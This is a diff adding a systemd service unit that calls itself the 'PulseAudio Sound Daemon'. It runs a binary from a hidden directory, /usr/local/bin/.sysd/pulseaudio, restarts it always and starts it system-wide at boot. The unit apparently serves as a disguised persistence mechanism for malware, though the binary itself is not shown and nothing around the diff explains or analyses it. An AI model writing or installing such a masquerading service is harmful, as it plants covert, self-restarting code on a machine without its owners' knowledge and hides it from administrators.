@@ -1,0 +1,10 @@
+[Unit]
+Description=PulseAudio Sound Daemon
+After=network.target
+
+[Service]
+ExecStart=/usr/local/bin/.sysd/pulseaudio
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
